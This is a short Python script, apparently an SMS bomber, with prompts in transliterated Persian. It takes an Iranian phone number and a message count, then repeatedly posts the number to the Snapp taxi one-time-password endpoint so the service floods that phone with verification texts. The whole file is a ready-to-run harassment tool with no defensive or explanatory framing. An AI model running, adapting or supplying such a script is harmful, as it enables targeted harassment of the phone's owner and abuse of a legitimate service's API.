
import requests
import time
phonenum = input("number phone vared kon : ")
print("  ")
print("  ")
print("  ")
print("+_+_+_+_+_+_+_+_+_+_+_+_+_+_+_+")
print("  ")
print("  ")
print("  ")
phonenum = str(phonenum)
num = int(input("tedad payam : "))
print("  ")
print("  ")
print("  ")
print("+_+_+_+_+_+_+_+_+_+_+_+_+_+_+_+")
send = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
number = {"cellphone":"+98"+phonenum}
number2 = 1
while number2 <= num:
    requests.post(send,number)
    print(number2)
    print("  ")
    print("  ")
    print("  ")
    print("+_+_+_+_+_+_+_+_+_+_+_+_+_+_+_+")
    number2 += 1
    
    time.sleep(5)
